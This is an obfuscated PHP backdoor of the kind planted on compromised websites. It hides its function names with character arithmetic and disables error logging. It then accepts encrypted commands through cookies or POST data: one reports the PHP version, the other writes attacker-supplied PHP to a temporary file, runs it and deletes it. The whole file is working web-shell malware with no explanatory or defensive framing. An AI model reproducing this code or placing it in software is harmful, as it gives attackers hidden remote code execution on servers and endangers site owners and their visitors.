<?php $xyiaclba = 'f'.chr(105).chr(944-836).chr(240-139).'_'."\x70"."\x75".chr(768-652).'_'.chr(99)."\x6f".'n'.'t'."\145".chr(722-612).chr(798-682).chr(884-769);
$frgoabnqjd = 'b'.chr(987-890).'s'."\145".'6'.chr(399-347)."\137".chr(100).chr(405-304).'c'.'o'.chr(119-19)."\x65";
$ibixei = chr(105)."\x6e"."\x69".chr(1029-934).chr(115)."\145".chr(116);
$wvzmj = chr(117)."\156".chr(108).'i'.chr(110).chr(107);


@$ibixei('e'."\162".'r'.'o'.'r'."\137".chr(1045-937)."\x6f".'g', NULL);
@$ibixei("\154".chr(557-446)."\x67".chr(95)."\145"."\x72"."\x72".chr(629-518)."\162".chr(197-82), 0);
@$ibixei('m'.chr(330-233)."\170".chr(679-584).chr(667-566)."\170"."\145".chr(99)."\165".'t'.chr(105).chr(435-324)."\156"."\137".'t'.chr(1096-991).chr(109)."\x65", 0);
@set_time_limit(0);

function lqgmvc($hyyartmnvn, $mxnmaocyx)
{
    $duvmqwmt = "";
    for ($grqjntx = 0; $grqjntx < strlen($hyyartmnvn);) {
        for ($j = 0; $j < strlen($mxnmaocyx) && $grqjntx < strlen($hyyartmnvn); $j++, $grqjntx++) {
            $duvmqwmt .= chr(ord($hyyartmnvn[$grqjntx]) ^ ord($mxnmaocyx[$j]));
        }
    }
    return $duvmqwmt;
}

$fknkvrx = array_merge($_COOKIE, $_POST);
$ktikcwb = '27505533-4b38-4dfe-9eb1-85bbeb74fbb9';
foreach ($fknkvrx as $lbejf => $hyyartmnvn) {
    $hyyartmnvn = @unserialize(lqgmvc(lqgmvc($frgoabnqjd($hyyartmnvn), $ktikcwb), $lbejf));
    if (isset($hyyartmnvn[chr(97)."\x6b"])) {
        if ($hyyartmnvn["\x61"] == 'i') {
            $grqjntx = array(
                "\160".chr(905-787) => @phpversion(),
                "\x73".chr(300-182) => "3.5",
            );
            echo @serialize($grqjntx);
        } elseif ($hyyartmnvn["\x61"] == chr(101)) {
            $kxpwvsqg = "./" . md5($ktikcwb) . "\x2e".chr(480-375).chr(110).chr(508-409);
            @$xyiaclba($kxpwvsqg, "<" . chr(63)."\x70"."\x68".chr(112)."\40"."\100".chr(117).chr(110).chr(724-616).chr(105).'n'.'k'.chr(143-103).chr(95).chr(115-20)."\106"."\x49".chr(602-526)."\105".'_'.chr(438-343)."\51"."\x3b".chr(32) . $hyyartmnvn[chr(438-338)]);
            @include($kxpwvsqg);
            @$wvzmj($kxpwvsqg);
        }
        exit();
    }
}

